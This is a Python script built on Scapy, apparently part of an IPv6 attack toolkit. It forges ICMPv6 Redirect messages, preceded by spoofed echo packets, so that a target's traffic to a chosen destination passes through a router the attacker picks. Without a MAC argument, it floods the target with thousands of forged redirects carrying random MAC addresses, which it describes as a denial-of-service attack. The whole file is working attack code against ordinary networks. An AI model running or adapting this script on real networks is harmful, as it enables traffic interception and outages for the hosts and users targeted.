#!/usr/bin/python3
import argparse
import random
import sys

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr, fragment6
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendpfast

from validate_parameters import is_valid_ipv6, is_valid_mac


def main():
    parser = argparse.ArgumentParser(description="Redirecting the route of a specified target to a destination. It "
                                                 "changes the traffic from getting through an existing hop to a new "
                                                 "hop.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of target")
    parser.add_argument("-dip", dest="destination_ip", action="store",
                        help="the IPv6 address of the destination, to which the target sends packets")
    parser.add_argument("-ort", dest="original_router", action="store",
                        help="the IPv6 address of the original router, which now forwards the packet from target to "
                             "destination")
    parser.add_argument("-nrt", dest="new_router", action="store",
                        help="the IPv6 address of the the router, which you want to forward the packet from target to "
                             "destination")
    parser.add_argument("-rmac", dest="router_mac", action="store",
                        help="the MAC address of the new router. This results in DoS attack with many falsified MAC "
                             "addresses when skipping")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.target_ip is None:
        print("---> IPv6 address of the target is required!!!")
        sys.exit(1)
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> IPv6 address of the destination is required!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the old router IPv6 address
    if args.original_router is None:
        print("---> IPv6 address of the original router is required!!!")
        sys.exit(1)
    if args.original_router is not None:
        if not is_valid_ipv6(args.original_router):
            print("---> The given original router IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the new router IPv6 address
    if args.new_router is None:
        print("---> IPv6 address of the new router is required!!!")
        sys.exit(1)
    if args.new_router is not None:
        if not is_valid_ipv6(args.new_router):
            print("---> The given new router IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the MAC address of the new router
    if args.router_mac is not None:
        if not is_valid_mac(args.router_mac):
            print("---> The given MAC address of new router is invalid. Try again!!!")
            sys.exit(1)

    # Generate the packet
    data = 16 * "A"
    base_1 = IPv6()
    base_1.src = args.destination_ip
    base_1.dst = args.target_ip
    packet1 = base_1 / ICMPv6EchoRequest(data=data)

    base_2 = IPv6()
    base_2.src = args.target_ip
    base_2.dst = args.destination_ip
    packet2 = base_2 / ICMPv6EchoReply(data=data)

    # Generate Redirect, but we need two previous messages to succeed in attack
    base_3 = IPv6()
    base_3.src = args.original_router
    base_3.dst = args.target_ip

    if args.router_mac is not None:
        packet3 = base_3 / ICMPv6ND_Redirect(tgt=args.new_router, dst=args.destination_ip) / \
                  ICMPv6NDOptDstLLAddr(lladdr=args.router_mac) / \
                  ICMPv6NDOptRedirectedHdr(pkt=packet2)
        send([packet1, packet2, packet3], verbose=False, iface=args.interface)
        print("Redirecting the traffic of the target: " + args.target_ip)
    if args.router_mac is None:
        random_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                  random.randint(0, 255),
                                                  random.randint(0, 255))
        pkt_list = []
        print("Flooding the traffic of target: " + args.target_ip + "with falsified Redirect messages (press Ctrl+C "
                                                                    "to stop the attack).....")
        source_mac = get_if_hwaddr(args.interface)
        packet3 = Ether(src=source_mac, dst="33:33:00:00:00:01") / base_3 / ICMPv6ND_Redirect(tgt=args.new_router,
                                                                                              dst=args.destination_ip) / \
                  ICMPv6NDOptDstLLAddr(lladdr=random_mac) / \
                  ICMPv6NDOptRedirectedHdr(pkt=packet2)
        for i in range(5000):
            pkt_list.append(packet3)
        send([packet1, packet2], verbose=False, iface=args.interface)
        try:
            sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
        except KeyboardInterrupt:
            sys.exit(0)


if __name__ == "__main__":
    main()
